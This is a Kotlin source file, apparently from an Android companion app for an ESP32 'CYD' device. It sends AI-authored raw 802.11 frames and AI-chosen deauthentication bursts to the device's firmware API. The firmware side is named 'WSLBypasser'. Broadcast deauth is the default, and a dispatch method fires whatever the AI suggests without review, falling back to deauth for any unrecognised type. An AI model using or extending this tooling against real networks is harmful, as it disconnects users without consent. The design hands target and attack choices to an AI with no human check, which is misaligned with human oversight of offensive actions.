package com.example.cydcompanion.ai

import com.example.cydcompanion.domain.AiSuggestion
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Dispatches AI-generated injection commands to the CYD firmware's REST API.
 *
 * Firmware endpoints (Phase 1 — implemented in main.cpp):
 *   POST /api/ai/inject_raw     { channel, hex }
 *   POST /api/ai/inject_deauth  { bssid, client, reason, count, channel }
 *
 * All methods are suspend-compatible via withContext(Dispatchers.IO) at the call site.
 * They return true on HTTP 200, false otherwise.
 */
class InjectionDispatcher(
    private val cydIp: String,
    private val port: Int = 8080,
    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(4, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()
) {

    /**
     * Send a fully-formed raw 802.11 frame (AI-authored) to the CYD radio.
     * The CYD firmware hex-decodes the payload and calls esp_wifi_80211_tx().
     */
    fun injectRaw(
        channel: Int,
        frameHex: String,
        onResult: (Boolean, String) -> Unit
    ) {
        val body = JSONObject().apply {
            put("channel", channel)
            put("hex", frameHex.uppercase())
        }.toString()

        val request = Request.Builder()
            .url("http://$cydIp:$port/api/ai/inject_raw")
            .post(body.toRequestBody("application/json".toMediaType()))
            .build()

        val response = try {
            this.client.newCall(request).execute()
        } catch (e: Exception) {
            onResult(false, "Network error: ${e.message}")
            return
        }
        try {
            val payload = response.body?.string() ?: "{}"
            val ok = response.isSuccessful
            val msg = if (ok) {
                val obj = runCatching { JSONObject(payload) }.getOrNull()
                "TX OK — len=${obj?.optInt("len", 0)} esp_err=${obj?.optInt("esp_err", 0)}"
            } else {
                "HTTP ${response.code}: $payload"
            }
            onResult(ok, msg)
        } finally {
            response.close()
        }
    }

    /**
     * Send an AI-chosen deauthentication burst to the CYD.
     * Uses WSLBypasser::sendDeauthBurst() on the firmware side.
     *
     * @param bssid   Target AP MAC (colon-separated)
     * @param client  Client MAC to kick, or "FF:FF:FF:FF:FF:FF" for broadcast
     * @param reason  802.11 reason code (AI picks this based on chipset; 7 is common)
     * @param count   Burst size — capped at 30 by firmware
     * @param channel Channel to use before TX (0 = stay on current)
     */
    fun injectDeauth(
        bssid: String,
        client: String = "FF:FF:FF:FF:FF:FF",
        reason: Int = 7,
        count: Int = 5,
        channel: Int = 0,
        onResult: (Boolean, String) -> Unit
    ) {
        val body = JSONObject().apply {
            put("bssid", bssid)
            put("client", client)
            put("reason", reason)
            put("count", count)
            if (channel > 0) put("channel", channel)
        }.toString()

        val request = Request.Builder()
            .url("http://$cydIp:$port/api/ai/inject_deauth")
            .post(body.toRequestBody("application/json".toMediaType()))
            .build()

        val response = try {
            this.client.newCall(request).execute()
        } catch (e: Exception) {
            onResult(false, "Network error: ${e.message}")
            return
        }
        try {
            val payload = response.body?.string() ?: "{}"
            val ok = response.isSuccessful
            val msg = if (ok) "Deauth burst sent: reason=$reason count=$count"
                      else "HTTP ${response.code}: $payload"
            onResult(ok, msg)
        } finally {
            response.close()
        }
    }

    /**
     * Convenience: dispatch whatever the AI suggested without the caller checking the type.
     * Routes to either injectRaw or injectDeauth based on [suggestion].injectionType.
     */
    fun dispatch(
        suggestion: AiSuggestion,
        targetBssid: String,
        targetClient: String = "FF:FF:FF:FF:FF:FF",
        channel: Int = 0,
        onResult: (Boolean, String) -> Unit
    ) {
        when (suggestion.injectionType.lowercase()) {
            "raw" -> {
                val hex = suggestion.frameHex
                if (hex.isNullOrBlank()) {
                    onResult(false, "AI returned injection_type=raw but no frame_hex")
                    return
                }
                injectRaw(channel = channel, frameHex = hex, onResult = onResult)
            }
            "disassoc" -> {
                // Disassoc is reason code 8 by convention; AI may override via reason_code
                injectDeauth(
                    bssid   = targetBssid,
                    client  = targetClient,
                    reason  = suggestion.reasonCode,
                    count   = suggestion.deauthCount,
                    channel = channel,
                    onResult = onResult
                )
            }
            else -> {                // "deauth" or anything unrecognised → standard deauth burst
                injectDeauth(
                    bssid   = targetBssid,
                    client  = targetClient,
                    reason  = suggestion.reasonCode,
                    count   = suggestion.deauthCount,
                    channel = channel,
                    onResult = onResult
                )
            }
        }
    }
}
